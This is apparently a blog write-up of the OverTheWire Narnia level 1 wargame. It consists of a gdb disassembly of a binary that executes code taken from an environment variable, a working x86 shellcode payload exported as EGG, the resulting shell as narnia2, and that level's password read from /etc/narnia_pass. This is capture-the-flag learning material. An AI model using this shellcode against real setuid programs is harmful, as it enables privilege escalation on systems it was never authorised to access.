+++
title = "Over the wire - narnia01"
description = "Over the wire - narnia01"
date ="2016-03-09"
draft = true
publishdate ="2016-03-09"
categories = ["security"]
tags = ["assembly", "linux", "binary"]
slug =  "over-the-wire-narnia-01"
project_url = "https://greyhat.dk/over-the-wire-narnia-01"
type = "post"
+++



(gdb) disassemble main
Dump of assembler code for function main:
   0x0804847d <+0>:	push   ebp
   0x0804847e <+1>:	mov    ebp,esp
   0x08048480 <+3>:	and    esp,0xfffffff0
   0x08048483 <+6>:	sub    esp,0x20
   0x08048486 <+9>:	mov    DWORD PTR [esp],0x8048570
   0x0804848d <+16>:	call   0x8048330 <getenv@plt>
   0x08048492 <+21>:	test   eax,eax
   0x08048494 <+23>:	jne    0x80484ae <main+49>
   0x08048496 <+25>:	mov    DWORD PTR [esp],0x8048574
   0x0804849d <+32>:	call   0x8048340 <puts@plt>
   0x080484a2 <+37>:	mov    DWORD PTR [esp],0x1
   0x080484a9 <+44>:	call   0x8048360 <exit@plt>
   0x080484ae <+49>:	mov    DWORD PTR [esp],0x80485a9
   0x080484b5 <+56>:	call   0x8048340 <puts@plt>
   0x080484ba <+61>:	mov    DWORD PTR [esp],0x8048570
   0x080484c1 <+68>:	call   0x8048330 <getenv@plt>
   0x080484c6 <+73>:	mov    DWORD PTR [esp+0x1c],eax
   0x080484ca <+77>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484ce <+81>:	call   eax
   0x080484d0 <+83>:	mov    eax,0x0
   0x080484d5 <+88>:	leave
   0x080484d6 <+89>:	ret
End of assembler dump.


narnia1@melinda:/narnia$ export EGG=$(python -c 'print "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
